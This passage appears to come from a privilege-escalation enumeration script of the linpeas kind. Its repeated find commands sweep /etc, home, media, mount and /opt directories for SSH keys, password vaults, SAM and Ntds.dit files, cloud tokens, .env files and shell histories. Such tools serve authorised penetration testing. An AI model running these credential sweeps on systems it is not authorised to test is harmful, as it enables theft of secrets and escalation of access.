\"gvm-tools.conf\" -o -name \"KeePass.config*\" -o -name \"*password*\" -o -name \"kcpassword\" -o -name \"bash.exe\" -o -name \"crio.sock\" -o -name \"secrets.yml\" -o -name \"NetSetup.log\" -o -name \"*.ovpn\" -o -name \"snmpd.conf\" -o -name \"unattended.xml\" -o -name \"SAM\" -o -name \"*.timer\" -o -name \"system.sav\" -o -name \"database.php\" -o -name \"sentry.conf.py\" -o -name \"pg_hba.conf\" -o -name \"error.log\" -o -name \".lesshst\" -o -name \"*.csr\" -o -name \"index.dat\" -o -name \"sitemanager.xml\" -o -name \".gitconfig\" -o -name \".msmtprc\" -o -name \"vault-ssh-helper.hcl\" -o -name \"frakti.sock\" -o -name \"*.p12\" -o -name \"*.ftpconfig\" -o -name \"ftp.ini\" -o -name \"AppEvent.Evt\" -o -name \"setupinfo.bak\" -o -name \"containerd.sock\" -o -name \"rocketchat.service\" -o -name \".ldaprc\" -o -name \"*.socket\" -o -name \"Dockerfile\" -o -name \"httpd.conf\" -o -name \"wcx_ftp.ini\" -o -name \"accessTokens.json\" -o -name \"appcmd.exe\" -o -name \"KeePass.enforced*\" -o -name \"*.rdg\" -o -name \"unattend.inf\" -o -name \"credentials.db\" -o -name \"RDCMan.settings\" -o -name \"kadm5.acl\" -o -name \"printers.xml\" -o -name \".recently-used.xbel\" -o -name \"php.ini\" -o -name \"*.viminfo\" -o -name \"nginx.conf\" -o -name \"*.kdbx\" -o -name \"SecEvent.Evt\" -o -name \"*_history*\" -o -name \"*.keytab\" -o -name \"pwd.ibd\" -o -name \"hostapd.conf\" -o -name \"id_dsa*\" -o -name \"iis6.log\" -o -name \"passwd.ibd\" -o -name \"FreeSSHDservice.ini\" -o -name \"redis.conf\" -o -name \"*credential*\" -o -name \"anaconda-ks.cfg\" -o -name \"ftp.config\" -o -name \"SYSTEM\" -o -name \".htpasswd\" -o -name \"rsyncd.conf\" -o -name \"datasources.xml\" -o -name \"recentservers.xml\" -o -name \"known_hosts\" -o -name \".sudo_as_admin_successful\" -o -name \"*.gnupg\" -o -name \"Ntds.dit\" -o -name \"sites.ini\" -o -name \"https-xampp.conf\" -o -name \"unattend.xml\" -o -name \"pgsql.conf\" -o -name \"tomcat-users.xml\" -o -name \"config.php\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_ETC=`eval_bckgrd "find /etc -name \"storage.php\" -o -name \"ipsec.conf\" -o -name \".bashrc\" -o -name \".plan\" -o -name \"setupinfo\" -o -name \"*.sqlite\" -o -name \"jetty-realm.properties\" -o -name \"*.crt\" -o -name \"*.jks\" -o -name \"scclient.exe\" -o -name \"*.keystore\" -o -name \"software\" -o -name \".pypirc\" -o -name \"sssd.conf\" -o -name \"ffftp.ini\" -o -name \"*.cer\" -o -name \".vault-token\" -o -name \"id_rsa*\" -o -name \"backups\" -o -name \"autologin.conf\" -o -name \"filezilla.xml\" -o -name \"server.xml\" -o -name \".git-credentials\" -o -name \"glusterfs.ca\" -o -name \"zabbix_agentd.conf\" -o -name \"default.sav\" -o -name \"dockershim.sock\" -o -name \"ipsec.secrets\" -o -name \"postgresql.conf\" -o -name \"scheduledtasks.xml\" -o -name \"racoon.conf\" -o -name \"TokenCache.dat\" -o -name \"log4j-core*.jar\" -o -name \".erlang.cookie\" -o -name \"passwd\" -o -name \"protecteduserkey.bin\" -o -name \"cesi.conf\" -o -name \"mosquitto.conf\" -o -name \"*.pem\" -o -name \"AzureRMContext.json\" -o -name \"ntuser.dat\" -o -name \"*config*.php\" -o -name \"*.swp\" -o -name \"000-default.conf\" -o -name \"zabbix_server.conf\" -o -name \"supervisord.conf\" -o -name \"sysprep.inf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kibana.y*ml\" -o -name \"*vnc*.ini\" -o -name \"access_tokens.json\" -o -name \".env\" -o -name \".k5login\" -o -name \"*.keyring\" -o -name \"*vnc*.xml\" -o -name \"*.pgp\" -o -name \"*knockd*\" -o -name \".google_authenticator\" -o -name \"secrets.ldb\" -o -name \"backup\" -o -name \"authorized_hosts\" -o -name \"legacy_credentials.db\" -o -name \"ddclient.conf\" -o -name \"passbolt.php\" -o -name \"krb5.conf\" -o -name \"pgadmin*.db\" -o -name \"autologin\" -o -name \"unattend.txt\" -o -name \"*vnc*.txt\" -o -name \"debian.cnf\" -o -name \"fastcgi_params\" -o -name \"*.psk\" -o -name \"hosts.equiv\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"settings.php\" -o -name \"azureProfile.json\" -o -name \"*.gpg\" -o -name \"glusterfs.pem\" -o -name \"web*.config\" -o -name \"glusterfs.key\" -o -name \"*.sqlite3\" -o -name \"rktlet.sock\" -o -name \"pagefile.sys\" -o -name \".wgetrc\" -o -name \"rsyncd.secrets\" -o -name \"wp-config.php\" -o -name \"cloud.cfg\" -o -name \"elasticsearch.y*ml\" -o -name \"security.sav\" -o -name \".git\" -o -name \"https.conf\" -o -name \"access_tokens.db\" -o -name \"*.db\" -o -name \"winscp.ini\" -o -name \"psk.txt\" -o -name \"software.sav\" -o -name \"my.cnf\" -o -name \"mongod*.conf\" -o -name \"creds*\" -o -name \"KeePass.ini\" -o -name \"*.service\" -o -name \"password*.ibd\" -o -name \"*.key\" -o -name \"drives.xml\" -o -name \"*.pfx\" -o -name \"mariadb.cnf\" -o -name \"my.ini\" -o -name \"db.php\" -o -name \"gitlab.yml\" -o -name \"*.der\" -o -name \"*vnc*.c*nf*\" -o -name \"docker-compose.yml\" -o -name \"docker.sock\" -o -name \"access.log\" -o -name \".rhosts\" -o -name \"gitlab.rm\" -o -name \"groups.xml\" -o -name \".github\" -o -name \"authorized_keys\" -o -name \"ws_ftp.ini\" -o -name \".secrets.mkey\" -o -name \".profile\" -o -name \"docker.socket\" -o -name \"wsl.exe\" -o -name \"gvm-tools.conf\" -o -name \"KeePass.config*\" -o -name \"*password*\" -o -name \"kcpassword\" -o -name \"bash.exe\" -o -name \"crio.sock\" -o -name \"secrets.yml\" -o -name \"NetSetup.log\" -o -name \"*.ovpn\" -o -name \"snmpd.conf\" -o -name \"unattended.xml\" -o -name \"SAM\" -o -name \"*.timer\" -o -name \"system.sav\" -o -name \"database.php\" -o -name \"sentry.conf.py\" -o -name \"pg_hba.conf\" -o -name \"error.log\" -o -name \".lesshst\" -o -name \"*.csr\" -o -name \"index.dat\" -o -name \"sitemanager.xml\" -o -name \".gitconfig\" -o -name \".msmtprc\" -o -name \"vault-ssh-helper.hcl\" -o -name \"frakti.sock\" -o -name \"*.p12\" -o -name \"*.ftpconfig\" -o -name \"ftp.ini\" -o -name \"AppEvent.Evt\" -o -name \"setupinfo.bak\" -o -name \"containerd.sock\" -o -name \"rocketchat.service\" -o -name \".ldaprc\" -o -name \"*.socket\" -o -name \"Dockerfile\" -o -name \"httpd.conf\" -o -name \"wcx_ftp.ini\" -o -name \"accessTokens.json\" -o -name \"appcmd.exe\" -o -name \"KeePass.enforced*\" -o -name \"*.rdg\" -o -name \"unattend.inf\" -o -name \"credentials.db\" -o -name \"RDCMan.settings\" -o -name \"kadm5.acl\" -o -name \"printers.xml\" -o -name \".recently-used.xbel\" -o -name \"php.ini\" -o -name \"*.viminfo\" -o -name \"nginx.conf\" -o -name \"*.kdbx\" -o -name \"SecEvent.Evt\" -o -name \"*_history*\" -o -name \"*.keytab\" -o -name \"pwd.ibd\" -o -name \"hostapd.conf\" -o -name \"id_dsa*\" -o -name \"iis6.log\" -o -name \"passwd.ibd\" -o -name \"FreeSSHDservice.ini\" -o -name \"redis.conf\" -o -name \"*credential*\" -o -name \"anaconda-ks.cfg\" -o -name \"ftp.config\" -o -name \"SYSTEM\" -o -name \".htpasswd\" -o -name \"rsyncd.conf\" -o -name \"exports\" -o -name \"datasources.xml\" -o -name \"recentservers.xml\" -o -name \"known_hosts\" -o -name \".sudo_as_admin_successful\" -o -name \"*.gnupg\" -o -name \"Ntds.dit\" -o -name \"sites.ini\" -o -name \"https-xampp.conf\" -o -name \"unattend.xml\" -o -name \"pgsql.conf\" -o -name \"tomcat-users.xml\" -o -name \"config.php\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_HOMESEARCH=`eval_bckgrd "find $HOMESEARCH -name \"storage.php\" -o -name \"ipsec.conf\" -o -name \".bashrc\" -o -name \".plan\" -o -name \"setupinfo\" -o -name \"*.sqlite\" -o -name \"jetty-realm.properties\" -o -name \"*.crt\" -o -name \"*.jks\" -o -name \"scclient.exe\" -o -name \"*.keystore\" -o -name \"software\" -o -name \".pypirc\" -o -name \"sssd.conf\" -o -name \"ffftp.ini\" -o -name \"*.cer\" -o -name \".vault-token\" -o -name \"id_rsa*\" -o -name \"backups\" -o -name \"autologin.conf\" -o -name \"filezilla.xml\" -o -name \"server.xml\" -o -name \".git-credentials\" -o -name \"glusterfs.ca\" -o -name \"zabbix_agentd.conf\" -o -name \"default.sav\" -o -name \"dockershim.sock\" -o -name \"ipsec.secrets\" -o -name \"postgresql.conf\" -o -name \"scheduledtasks.xml\" -o -name \"racoon.conf\" -o -name \"TokenCache.dat\" -o -name \"log4j-core*.jar\" -o -name \".erlang.cookie\" -o -name \"passwd\" -o -name \"protecteduserkey.bin\" -o -name \"cesi.conf\" -o -name \"mosquitto.conf\" -o -name \"ssh*config\" -o -name \"*.pem\" -o -name \"AzureRMContext.json\" -o -name \"ntuser.dat\" -o -name \"*config*.php\" -o -name \"*.swp\" -o -name \"000-default.conf\" -o -name \"zabbix_server.conf\" -o -name \"supervisord.conf\" -o -name \"sysprep.inf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kibana.y*ml\" -o -name \"*vnc*.ini\" -o -name \"access_tokens.json\" -o -name \".env\" -o -name \".k5login\" -o -name \"*.keyring\" -o -name \"*vnc*.xml\" -o -name \"*.pgp\" -o -name \".google_authenticator\" -o -name \"secrets.ldb\" -o -name \"backup\" -o -name \"authorized_hosts\" -o -name \"legacy_credentials.db\" -o -name \"ddclient.conf\" -o -name \"passbolt.php\" -o -name \"krb5.conf\" -o -name \"pgadmin*.db\" -o -name \"autologin\" -o -name \"unattend.txt\" -o -name \"*vnc*.txt\" -o -name \"debian.cnf\" -o -name \"fastcgi_params\" -o -name \"*.psk\" -o -name \"hosts.equiv\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"settings.php\" -o -name \"azureProfile.json\" -o -name \"*.gpg\" -o -name \"glusterfs.pem\" -o -name \"web*.config\" -o -name \"glusterfs.key\" -o -name \"*.sqlite3\" -o -name \"rktlet.sock\" -o -name \"pagefile.sys\" -o -name \".wgetrc\" -o -name \"rsyncd.secrets\" -o -name \"wp-config.php\" -o -name \"cloud.cfg\" -o -name \"elasticsearch.y*ml\" -o -name \"security.sav\" -o -name \".git\" -o -name \"https.conf\" -o -name \"access_tokens.db\" -o -name \"*.db\" -o -name \"winscp.ini\" -o -name \"psk.txt\" -o -name \"software.sav\" -o -name \"my.cnf\" -o -name \"mongod*.conf\" -o -name \"creds*\" -o -name \"KeePass.ini\" -o -name \"*.service\" -o -name \"password*.ibd\" -o -name \"*.key\" -o -name \"drives.xml\" -o -name \"*.pfx\" -o -name \"mariadb.cnf\" -o -name \"my.ini\" -o -name \"db.php\" -o -name \"gitlab.yml\" -o -name \"*.der\" -o -name \"*vnc*.c*nf*\" -o -name \"docker-compose.yml\" -o -name \"docker.sock\" -o -name \"access.log\" -o -name \".rhosts\" -o -name \"gitlab.rm\" -o -name \"groups.xml\" -o -name \".github\" -o -name \"authorized_keys\" -o -name \"ws_ftp.ini\" -o -name \".secrets.mkey\" -o -name \".profile\" -o -name \"docker.socket\" -o -name \"wsl.exe\" -o -name \"gvm-tools.conf\" -o -name \"KeePass.config*\" -o -name \"*password*\" -o -name \"kcpassword\" -o -name \"bash.exe\" -o -name \"crio.sock\" -o -name \"secrets.yml\" -o -name \"NetSetup.log\" -o -name \"*.ovpn\" -o -name \"snmpd.conf\" -o -name \"unattended.xml\" -o -name \"SAM\" -o -name \"*.timer\" -o -name \"system.sav\" -o -name \"database.php\" -o -name \"sentry.conf.py\" -o -name \"pg_hba.conf\" -o -name \"error.log\" -o -name \".lesshst\" -o -name \"*.csr\" -o -name \"index.dat\" -o -name \"sitemanager.xml\" -o -name \".gitconfig\" -o -name \".msmtprc\" -o -name \"vault-ssh-helper.hcl\" -o -name \"frakti.sock\" -o -name \"*.p12\" -o -name \"*.ftpconfig\" -o -name \"ftp.ini\" -o -name \"AppEvent.Evt\" -o -name \"setupinfo.bak\" -o -name \"containerd.sock\" -o -name \"rocketchat.service\" -o -name \".ldaprc\" -o -name \"*.socket\" -o -name \"Dockerfile\" -o -name \"httpd.conf\" -o -name \"wcx_ftp.ini\" -o -name \"accessTokens.json\" -o -name \"appcmd.exe\" -o -name \"KeePass.enforced*\" -o -name \"*.rdg\" -o -name \"unattend.inf\" -o -name \"credentials.db\" -o -name \"RDCMan.settings\" -o -name \"kadm5.acl\" -o -name \"printers.xml\" -o -name \".recently-used.xbel\" -o -name \"php.ini\" -o -name \"*.viminfo\" -o -name \"nginx.conf\" -o -name \"*.kdbx\" -o -name \"SecEvent.Evt\" -o -name \"*_history*\" -o -name \"*.keytab\" -o -name \"pwd.ibd\" -o -name \"hostapd.conf\" -o -name \"id_dsa*\" -o -name \"iis6.log\" -o -name \"passwd.ibd\" -o -name \"FreeSSHDservice.ini\" -o -name \"redis.conf\" -o -name \"*credential*\" -o -name \"anaconda-ks.cfg\" -o -name \"ftp.config\" -o -name \"SYSTEM\" -o -name \".htpasswd\" -o -name \"rsyncd.conf\" -o -name \"datasources.xml\" -o -name \"recentservers.xml\" -o -name \"known_hosts\" -o -name \".sudo_as_admin_successful\" -o -name \"*.gnupg\" -o -name \"Ntds.dit\" -o -name \"sites.ini\" -o -name \"https-xampp.conf\" -o -name \"unattend.xml\" -o -name \"pgsql.conf\" -o -name \"tomcat-users.xml\" -o -name \"config.php\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_LIB=`eval_bckgrd "find /lib -name \"*.socket\" -o -name \"log4j-core*.jar\" -o -name \"*.timer\" -o -name \"*.service\" -o -name \"rocketchat.service\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_LIB32=`eval_bckgrd "find /lib32 -name \"*.timer\" -o -name \"*.service\" -o -name \"*.socket\" -o -name \"log4j-core*.jar\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_LIB64=`eval_bckgrd "find /lib64 -name \"*.timer\" -o -name \"*.service\" -o -name \"*.socket\" -o -name \"log4j-core*.jar\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_MEDIA=`eval_bckgrd "find /media -name \"storage.php\" -o -name \"ipsec.conf\" -o -name \".bashrc\" -o -name \".plan\" -o -name \"setupinfo\" -o -name \"*.sqlite\" -o -name \"jetty-realm.properties\" -o -name \"*.crt\" -o -name \"*.jks\" -o -name \"scclient.exe\" -o -name \"*.keystore\" -o -name \"software\" -o -name \".pypirc\" -o -name \"sssd.conf\" -o -name \"ffftp.ini\" -o -name \"*.cer\" -o -name \".vault-token\" -o -name \"id_rsa*\" -o -name \"backups\" -o -name \"autologin.conf\" -o -name \"filezilla.xml\" -o -name \"server.xml\" -o -name \".git-credentials\" -o -name \"glusterfs.ca\" -o -name \"zabbix_agentd.conf\" -o -name \"default.sav\" -o -name \"dockershim.sock\" -o -name \"ipsec.secrets\" -o -name \"postgresql.conf\" -o -name \"scheduledtasks.xml\" -o -name \"racoon.conf\" -o -name \"TokenCache.dat\" -o -name \"log4j-core*.jar\" -o -name \".erlang.cookie\" -o -name \"passwd\" -o -name \"protecteduserkey.bin\" -o -name \"cesi.conf\" -o -name \"mosquitto.conf\" -o -name \"*.pem\" -o -name \"AzureRMContext.json\" -o -name \"ntuser.dat\" -o -name \"*config*.php\" -o -name \"*.swp\" -o -name \"000-default.conf\" -o -name \"zabbix_server.conf\" -o -name \"supervisord.conf\" -o -name \"sysprep.inf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kibana.y*ml\" -o -name \"*vnc*.ini\" -o -name \"access_tokens.json\" -o -name \".env\" -o -name \".k5login\" -o -name \"*.keyring\" -o -name \"*vnc*.xml\" -o -name \"*.pgp\" -o -name \".google_authenticator\" -o -name \"secrets.ldb\" -o -name \"backup\" -o -name \"authorized_hosts\" -o -name \"legacy_credentials.db\" -o -name \"ddclient.conf\" -o -name \"passbolt.php\" -o -name \"krb5.conf\" -o -name \"pgadmin*.db\" -o -name \"autologin\" -o -name \"unattend.txt\" -o -name \"*vnc*.txt\" -o -name \"debian.cnf\" -o -name \"fastcgi_params\" -o -name \"*.psk\" -o -name \"hosts.equiv\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"settings.php\" -o -name \"azureProfile.json\" -o -name \"*.gpg\" -o -name \"glusterfs.pem\" -o -name \"web*.config\" -o -name \"glusterfs.key\" -o -name \"*.sqlite3\" -o -name \"rktlet.sock\" -o -name \"pagefile.sys\" -o -name \".wgetrc\" -o -name \"rsyncd.secrets\" -o -name \"wp-config.php\" -o -name \"cloud.cfg\" -o -name \"elasticsearch.y*ml\" -o -name \"security.sav\" -o -name \".git\" -o -name \"https.conf\" -o -name \"access_tokens.db\" -o -name \"*.db\" -o -name \"winscp.ini\" -o -name \"psk.txt\" -o -name \"software.sav\" -o -name \"my.cnf\" -o -name \"mongod*.conf\" -o -name \"creds*\" -o -name \"KeePass.ini\" -o -name \"*.service\" -o -name \"password*.ibd\" -o -name \"*.key\" -o -name \"drives.xml\" -o -name \"*.pfx\" -o -name \"mariadb.cnf\" -o -name \"my.ini\" -o -name \"db.php\" -o -name \"gitlab.yml\" -o -name \"*.der\" -o -name \"*vnc*.c*nf*\" -o -name \"docker-compose.yml\" -o -name \"docker.sock\" -o -name \"access.log\" -o -name \".rhosts\" -o -name \"gitlab.rm\" -o -name \"groups.xml\" -o -name \".github\" -o -name \"authorized_keys\" -o -name \"ws_ftp.ini\" -o -name \".secrets.mkey\" -o -name \".profile\" -o -name \"docker.socket\" -o -name \"wsl.exe\" -o -name \"gvm-tools.conf\" -o -name \"KeePass.config*\" -o -name \"*password*\" -o -name \"kcpassword\" -o -name \"bash.exe\" -o -name \"crio.sock\" -o -name \"secrets.yml\" -o -name \"NetSetup.log\" -o -name \"*.ovpn\" -o -name \"snmpd.conf\" -o -name \"unattended.xml\" -o -name \"SAM\" -o -name \"*.timer\" -o -name \"system.sav\" -o -name \"database.php\" -o -name \"sentry.conf.py\" -o -name \"pg_hba.conf\" -o -name \"error.log\" -o -name \".lesshst\" -o -name \"*.csr\" -o -name \"index.dat\" -o -name \"sitemanager.xml\" -o -name \".gitconfig\" -o -name \".msmtprc\" -o -name \"vault-ssh-helper.hcl\" -o -name \"frakti.sock\" -o -name \"*.p12\" -o -name \"*.ftpconfig\" -o -name \"ftp.ini\" -o -name \"AppEvent.Evt\" -o -name \"setupinfo.bak\" -o -name \"containerd.sock\" -o -name \"rocketchat.service\" -o -name \".ldaprc\" -o -name \"*.socket\" -o -name \"Dockerfile\" -o -name \"httpd.conf\" -o -name \"wcx_ftp.ini\" -o -name \"accessTokens.json\" -o -name \"appcmd.exe\" -o -name \"KeePass.enforced*\" -o -name \"*.rdg\" -o -name \"unattend.inf\" -o -name \"credentials.db\" -o -name \"RDCMan.settings\" -o -name \"kadm5.acl\" -o -name \"printers.xml\" -o -name \".recently-used.xbel\" -o -name \"php.ini\" -o -name \"*.viminfo\" -o -name \"nginx.conf\" -o -name \"*.kdbx\" -o -name \"SecEvent.Evt\" -o -name \"*_history*\" -o -name \"*.keytab\" -o -name \"pwd.ibd\" -o -name \"hostapd.conf\" -o -name \"id_dsa*\" -o -name \"iis6.log\" -o -name \"passwd.ibd\" -o -name \"FreeSSHDservice.ini\" -o -name \"redis.conf\" -o -name \"*credential*\" -o -name \"anaconda-ks.cfg\" -o -name \"ftp.config\" -o -name \"SYSTEM\" -o -name \".htpasswd\" -o -name \"rsyncd.conf\" -o -name \"datasources.xml\" -o -name \"recentservers.xml\" -o -name \"known_hosts\" -o -name \".sudo_as_admin_successful\" -o -name \"*.gnupg\" -o -name \"Ntds.dit\" -o -name \"sites.ini\" -o -name \"https-xampp.conf\" -o -name \"unattend.xml\" -o -name \"pgsql.conf\" -o -name \"tomcat-users.xml\" -o -name \"config.php\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_MNT=`eval_bckgrd "find /mnt -name \"storage.php\" -o -name \"ipsec.conf\" -o -name \".bashrc\" -o -name \".plan\" -o -name \"setupinfo\" -o -name \"*.sqlite\" -o -name \"jetty-realm.properties\" -o -name \"*.crt\" -o -name \"*.jks\" -o -name \"scclient.exe\" -o -name \"*.keystore\" -o -name \"software\" -o -name \".pypirc\" -o -name \"sssd.conf\" -o -name \"ffftp.ini\" -o -name \"*.cer\" -o -name \".vault-token\" -o -name \"id_rsa*\" -o -name \"backups\" -o -name \"autologin.conf\" -o -name \"filezilla.xml\" -o -name \"server.xml\" -o -name \".git-credentials\" -o -name \"glusterfs.ca\" -o -name \"zabbix_agentd.conf\" -o -name \"default.sav\" -o -name \"dockershim.sock\" -o -name \"ipsec.secrets\" -o -name \"postgresql.conf\" -o -name \"scheduledtasks.xml\" -o -name \"racoon.conf\" -o -name \"TokenCache.dat\" -o -name \"log4j-core*.jar\" -o -name \".erlang.cookie\" -o -name \"passwd\" -o -name \"protecteduserkey.bin\" -o -name \"cesi.conf\" -o -name \"mosquitto.conf\" -o -name \"*.pem\" -o -name \"AzureRMContext.json\" -o -name \"ntuser.dat\" -o -name \"*config*.php\" -o -name \"*.swp\" -o -name \"000-default.conf\" -o -name \"zabbix_server.conf\" -o -name \"supervisord.conf\" -o -name \"sysprep.inf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kibana.y*ml\" -o -name \"*vnc*.ini\" -o -name \"access_tokens.json\" -o -name \".env\" -o -name \".k5login\" -o -name \"*.keyring\" -o -name \"*vnc*.xml\" -o -name \"*.pgp\" -o -name \".google_authenticator\" -o -name \"secrets.ldb\" -o -name \"backup\" -o -name \"authorized_hosts\" -o -name \"legacy_credentials.db\" -o -name \"ddclient.conf\" -o -name \"passbolt.php\" -o -name \"krb5.conf\" -o -name \"pgadmin*.db\" -o -name \"autologin\" -o -name \"unattend.txt\" -o -name \"*vnc*.txt\" -o -name \"debian.cnf\" -o -name \"fastcgi_params\" -o -name \"*.psk\" -o -name \"hosts.equiv\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"settings.php\" -o -name \"azureProfile.json\" -o -name \"*.gpg\" -o -name \"glusterfs.pem\" -o -name \"web*.config\" -o -name \"glusterfs.key\" -o -name \"*.sqlite3\" -o -name \"rktlet.sock\" -o -name \"pagefile.sys\" -o -name \".wgetrc\" -o -name \"rsyncd.secrets\" -o -name \"wp-config.php\" -o -name \"cloud.cfg\" -o -name \"elasticsearch.y*ml\" -o -name \"security.sav\" -o -name \".git\" -o -name \"https.conf\" -o -name \"access_tokens.db\" -o -name \"*.db\" -o -name \"winscp.ini\" -o -name \"psk.txt\" -o -name \"software.sav\" -o -name \"my.cnf\" -o -name \"mongod*.conf\" -o -name \"creds*\" -o -name \"KeePass.ini\" -o -name \"*.service\" -o -name \"password*.ibd\" -o -name \"*.key\" -o -name \"drives.xml\" -o -name \"*.pfx\" -o -name \"mariadb.cnf\" -o -name \"my.ini\" -o -name \"db.php\" -o -name \"gitlab.yml\" -o -name \"*.der\" -o -name \"*vnc*.c*nf*\" -o -name \"docker-compose.yml\" -o -name \"docker.sock\" -o -name \"access.log\" -o -name \".rhosts\" -o -name \"gitlab.rm\" -o -name \"groups.xml\" -o -name \".github\" -o -name \"authorized_keys\" -o -name \"ws_ftp.ini\" -o -name \".secrets.mkey\" -o -name \".profile\" -o -name \"docker.socket\" -o -name \"wsl.exe\" -o -name \"gvm-tools.conf\" -o -name \"KeePass.config*\" -o -name \"*password*\" -o -name \"kcpassword\" -o -name \"bash.exe\" -o -name \"crio.sock\" -o -name \"secrets.yml\" -o -name \"NetSetup.log\" -o -name \"*.ovpn\" -o -name \"snmpd.conf\" -o -name \"unattended.xml\" -o -name \"SAM\" -o -name \"*.timer\" -o -name \"system.sav\" -o -name \"database.php\" -o -name \"sentry.conf.py\" -o -name \"pg_hba.conf\" -o -name \"error.log\" -o -name \".lesshst\" -o -name \"*.csr\" -o -name \"index.dat\" -o -name \"sitemanager.xml\" -o -name \".gitconfig\" -o -name \".msmtprc\" -o -name \"vault-ssh-helper.hcl\" -o -name \"frakti.sock\" -o -name \"*.p12\" -o -name \"*.ftpconfig\" -o -name \"ftp.ini\" -o -name \"AppEvent.Evt\" -o -name \"setupinfo.bak\" -o -name \"containerd.sock\" -o -name \"rocketchat.service\" -o -name \".ldaprc\" -o -name \"*.socket\" -o -name \"Dockerfile\" -o -name \"httpd.conf\" -o -name \"wcx_ftp.ini\" -o -name \"accessTokens.json\" -o -name \"appcmd.exe\" -o -name \"KeePass.enforced*\" -o -name \"*.rdg\" -o -name \"unattend.inf\" -o -name \"credentials.db\" -o -name \"RDCMan.settings\" -o -name \"kadm5.acl\" -o -name \"printers.xml\" -o -name \".recently-used.xbel\" -o -name \"php.ini\" -o -name \"*.viminfo\" -o -name \"nginx.conf\" -o -name \"*.kdbx\" -o -name \"SecEvent.Evt\" -o -name \"*_history*\" -o -name \"*.keytab\" -o -name \"pwd.ibd\" -o -name \"hostapd.conf\" -o -name \"id_dsa*\" -o -name \"iis6.log\" -o -name \"passwd.ibd\" -o -name \"FreeSSHDservice.ini\" -o -name \"redis.conf\" -o -name \"*credential*\" -o -name \"anaconda-ks.cfg\" -o -name \"ftp.config\" -o -name \"SYSTEM\" -o -name \".htpasswd\" -o -name \"sess_*\" -o -name \"rsyncd.conf\" -o -name \"datasources.xml\" -o -name \"recentservers.xml\" -o -name \"known_hosts\" -o -name \".sudo_as_admin_successful\" -o -name \"*.gnupg\" -o -name \"Ntds.dit\" -o -name \"sites.ini\" -o -name \"https-xampp.conf\" -o -name \"unattend.xml\" -o -name \"pgsql.conf\" -o -name \"tomcat-users.xml\" -o -name \"config.php\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_OPT=`eval_bckgrd "find /opt -name \"storage.php\" -o -name \"ipsec.conf\" -o -name \".bashrc\" -o -name \".plan\" -o -name \"setupinfo\" -o -name \"*.sqlite\" -o -name \"jetty-realm.properties\" -o -name \"*.crt\" -o -name \"*.jks\" -o -name \"scclient.exe\" -o -name \"*.keystore\" -o -name \"software\" -o -name \".pypirc\" -o -name \"sssd.conf\" -o -name \"ffftp.ini\" -o -name \"*.cer\" -o -name \".vault-token\" -o -name \"id_rsa*\" -o -name \"backups\" -o -name \"autologin.conf\" -o -name \"filezilla.xml\" -o -name \"server.xml\" -o -name \".git-credentials\" -o -name \"glusterfs.ca\" -o -name \"zabbix_agentd.conf\" -o -name \"default.sav\" -o -name \"dockershim.sock\" -o -name \"ipsec.secrets\" -o -name \"postgresql.conf\" -o -name \"scheduledtasks.xml\" -o -name \"racoon.conf\" -o -name \"TokenCache.dat\" -o -name \"log4j-core*.jar\" -o -name \".erlang.cookie\" -o -name \"passwd\" -o -name \"protecteduserkey.bin\" -o -name \"cesi.conf\" -o -name \"mosquitto.conf\" -o -name \"*.pem\" -o -name \"AzureRMContext.json\" -o -name \"ntuser.dat\" -o -name \"*config*.php\" -o -name \"*.swp\" -o -name \"000-default.conf\" -o -name \"zabbix_server.conf\" -o -name \"supervisord.conf\" -o -name \"sysprep.inf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kibana.y*ml\" -o -name \"*vnc*.ini\" -o -name \"access_tokens.json\" -o -name \".env\" -o -name \".k5login\" -o -name \"*.keyring\" -o -name \"*vnc*.xml\" -o -name \"*.pgp\" -o -name \".google_authenticator\" -o -name \"secrets.ldb\" -o -name \"backup\" -o -name \"authorized_hosts\" -o -name \"legacy_credentials.db\" -o -name \"ddclient.conf\" -o -name \"passbolt.php\" -o -name \"krb5.conf\" -o -name \"pgadmin*.db\" -o -name \"autologin\" -o -name \"unattend.txt\" -o -name \"*vnc*.txt\" -o -name \"debian.cnf\" -o -name \"fastcgi_params\" -o -name \"*.psk\" -o -name \"hosts.equiv\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"settings.php\" -o -name \"azureProfile.json\" -o -name \"*.gpg\" -o -name \"glusterfs.pem\" -o -name \"web*.config\" -o -name \"glusterfs.key\" -o -name \"*.sqlite3\" -o -name \"rktlet.sock\" -o -name \"pagefile.sys\" -o -name \".wgetrc\" -o -name \"rsyncd.secrets\" -o -name \"wp-config.php\" -o -name \"cloud.cfg\" -o -name \"elasticsearch.y*ml\" -o -name \"security.sav\" -o -name \".git\" -o -name \"https.conf\" -o -name \"access_tokens.db\" -o -name \"*.db\" -o -name \"winscp.ini\" -o -name \"psk.txt\" -o -name \"software.sav\" -o -name \"my.cnf\" -o -name \"mongod*.conf\" -o -name \"creds*\" -o -name \"KeePass.ini\" -o -name \"*.service\" -o -name \"password*.ibd\" -o -name \"*.key\" -o -name \"drives.xml\" -o -name \"*.pfx\" -o -name \"mariadb.cnf\" -o -name \"my.ini\" -o -name \"db.php\" -o -name \"gitlab.yml\" -o -name \"*.der\" -o -name \"*vnc*.c*nf*\" -o -name \"docker-compose.yml\" -o -name \"docker.sock\" -o -name \"access.log\" -o -name \".rhosts\" -o -name \"gitlab.rm\" -o -name \"groups.xml\" -o -name \".github\" -o -name \"authorized_keys\" -o -name \"ws_ftp.ini\" -o -name 